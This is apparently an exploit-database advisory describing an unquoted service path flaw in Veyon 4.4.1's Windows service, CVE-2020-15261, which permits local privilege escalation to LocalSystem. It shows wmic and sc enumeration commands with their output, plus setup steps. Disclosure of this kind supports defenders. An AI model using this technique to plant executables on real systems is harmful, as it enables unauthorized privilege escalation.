# Exploit Title: Veyon 4.4.1 - 'VeyonService' Unquoted Service Path
# Discovery by: Víctor García
# Discovery Date: 2020-03-23
# Vendor Homepage: https://veyon.io/
# Software Link: https://github.com/veyon/veyon/releases/download/v4.4.1/veyon-4.4.1.0-win64-setup.exe
# Tested Version: 4.4.1
# Vulnerability Type: Unquoted Service Path
# Tested on: Windows 10 Pro x64
# CVE: CVE-2020-15261

Vulnerability Description:
The Veyon 4.4.1 service installs with an unquoted service path, making it susceptible to a privilege escalation vulnerability. An attacker with local access can exploit this by placing a malicious executable in a directory within the unquoted path. Upon service restart or system reboot, this malicious code can be executed with elevated privileges.

# Step to discover Unquoted Service Path:

C:\>wmic service get name,displayname,pathname,startmode |findstr /i
"auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
Veyon Service     VeyonService     C:\Program Files\Veyon\veyon-service.exe


# Service info:

C:\>sc qc VeyonService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VeyonService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Veyon\veyon-service.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Veyon Service
        DEPENDENCIES       : Tcpip
                           : RpcSs
        SERVICE_START_NAME : LocalSystem


# Exploit:

# A successful attempt would require the local user to be able to insert their code in the
# system root path undetected by the OS or other security applications where it could
# potentially be executed during application startup or reboot. If successful, the local
# user's code would execute with the elevated privileges of the application.


Instructions:

Download Veyon:

Use the provided link to download the Veyon 4.4.1 installer.
Installation:

Run the installer and follow the on-screen instructions.
Install it in the default path: C:\Program Files\Veyon\.
Configure Service:

Veyon installs as a service named VeyonService.
Ensure that the service is set to Auto-Start upon system boot.
Testing Setup:
Use the following command to confirm the service is running and check the unquoted service path:
sc qc VeyonService
Testing the Exploit:
Follow the steps mentioned in the Exploit Code document to test for the unquoted service path vulnerability.